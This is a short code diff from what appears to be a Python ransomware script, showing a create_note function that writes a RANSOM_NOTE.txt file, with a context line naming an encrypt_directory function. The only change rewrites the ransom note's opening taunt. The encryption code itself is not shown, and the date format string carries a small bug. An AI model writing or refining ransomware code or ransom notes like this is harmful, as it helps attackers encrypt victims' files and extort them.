@@ -38,7 +38,7 @@ def encrypt_directory():
 def create_note():
     date = datetime.date.today().strftime('%d-%B-Y')
     with open('RANSOM_NOTE.txt', 'w') as f:
-        f.write(f''' Your data is not longer yours
+        f.write(f''' You never saw it coming!
         
 
 ....    ....   ....    ....   ....    ....   ....    ....   ....    ....   ....    ....   ....    ....   ....    ....    
